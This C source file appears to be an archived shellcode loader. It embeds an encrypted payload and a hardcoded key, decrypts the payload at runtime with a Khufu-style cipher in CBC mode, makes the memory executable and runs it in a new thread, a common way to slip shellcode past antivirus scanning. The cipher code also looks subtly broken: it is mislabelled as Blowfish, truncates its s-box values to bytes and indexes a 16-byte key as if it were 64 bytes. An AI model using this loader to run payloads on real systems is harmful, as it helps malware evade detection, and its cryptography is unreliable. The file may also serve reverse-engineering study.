/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory.
    implementing Khufu algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    Khufu algorithm
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/Khufu/code.c

Note:
    - mode: CBC (Cipher Block Chaining)
    - IV is appended into the shellcode
*/

#include <windows.h>
#include <stdint.h>

/* ************************* CONFIGURATION & SEED ************************* */
#define BLOCKSIZE       64
#define BLOCKSIZEB      8
#define KEYSIZE         512
#define KEYSIZEB        64
#define ROUNDS          16

#ifdef _MSC_VER
    #include <stdlib.h>
    #pragma intrinsic(_lrotr,_lrotl)
    #define rotr(x,n)   _lrotr(x,n)
    #define rotl(x,n)   _lrotl(x,n)
#else 
    #define rotr(x,n)   (((x) >> ((int)(n))) | ((x) << (32 - (int)(n))))
    #define rotl(x,n)   (((x) << ((int)(n))) | ((x) >> (32 - (int)(n))))
#endif

#define bswap32(x)      (rotl(x,8) & 0x00FF00FF | rotr(x, 8) & 0xFF00FF00)

#if !defined(LITTLE_ENDIAN) && !defined(BIG_ENDIAN)
    #ifdef _MSC_VER
        #define LITTLE_ENDIAN
    #elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)
        #define LITTLE_ENDIAN 
    #elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_BIG_ENDIAN__)
        #define BIG_ENDIAN
    #else 
        #define BIG_ENDIAN
    #endif
#endif

#ifdef LITTLE_ENDIAN
    #define convert(x)   bswap32(x)
#else
    #define convert(x)   (x)
#endif


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void block_decrypt (uint8_t * data, uint8_t * key);

void gen_sbox(uint8_t * sbox, uint8_t * key, uint32_t round);


/* *************************** HELPER FUNCTIONS *************************** */
/* XOR 2 data block */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}


// Blowfish decryption with CBC
void decrypt(uint8_t * data, uint32_t size, uint8_t * key, uint8_t * iv)
{
    uint32_t i;
    uint8_t  prev_block[BLOCKSIZEB];
    uint8_t  cipher_block[BLOCKSIZEB];

    memcpy(prev_block, iv, BLOCKSIZEB);
    
    for (i = 0; i < size; i += BLOCKSIZEB)
    {
        // copy to temporary block
        memcpy(cipher_block, &data[i], BLOCKSIZEB);

        // decrypt the block
        block_decrypt(&data[i], key);

        // XOR the previous ciphertext with current ciphertext block
        xor_block(&data[i], &data[i], prev_block);

        // copy the current ciphertext as previous block
        memcpy(prev_block, cipher_block, BLOCKSIZEB); 
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    // IV is embedded within, so we need to mark both payload and IV
    uint8_t     payload []  = { 
        0x15, 0x20, 0x0c, 0x94, 0x64, 0x40, 0xd2, 0xc6, 0x90, 0xdb, 0x83, 0x05, 0x97, 0xb0, 0x38, 0x2f,
        0x15, 0x20, 0x0c, 0x94, 0x64, 0x40, 0xd2, 0xc6, 0x90, 0xdb, 0xdf, 0x56, 0x97, 0xb0, 0x38, 0x2f
    };
    uint32_t    payload_len = 24;
    uint8_t*    iv = &payload[payload_len];

    // secret-key
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);
    	
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}

void block_decrypt(uint8_t * data, uint8_t key[KEYSIZEB])
{
    uint32_t  * p_data = (uint32_t*)data;
    uint32_t  * p_key  = (uint32_t*)key;
    uint8_t     sbox[256];

    uint32_t    left  = convert(p_data[0]),
                right = convert(p_data[1]),
                temp;
    int32_t     round;

    left  ^= convert(p_key[2]);
    right ^= convert(p_key[3]);

    for (round = ROUNDS - 1; round >= 0; round--)
    {
        gen_sbox(sbox, key, round);

        temp  = right;
        right = left ^ sbox[right & 0xFF];
        left  = rotl(temp, 8);

        temp  = left;
        left  = right;
        right = temp;
    }

    left  ^= convert(p_key[0]);
    right ^= convert(p_key[1]);

    p_data[0] = convert(left);
    p_data[1] = convert(right);
}

void 
gen_sbox(uint8_t * sbox,uint8_t * key, uint32_t round)
{
    uint32_t i;

    for (i = 0; i < 256; i++)
    {
        sbox[i] = 
            (key[(round * 8 + i    ) % KEYSIZEB] << 24) ^
            (key[(round * 8 + i + 1) % KEYSIZEB] << 16) ^
            (key[(round * 8 + i + 2) % KEYSIZEB] << 8) ^
            (key[(round * 8 + i + 3) % KEYSIZEB]);
    }
}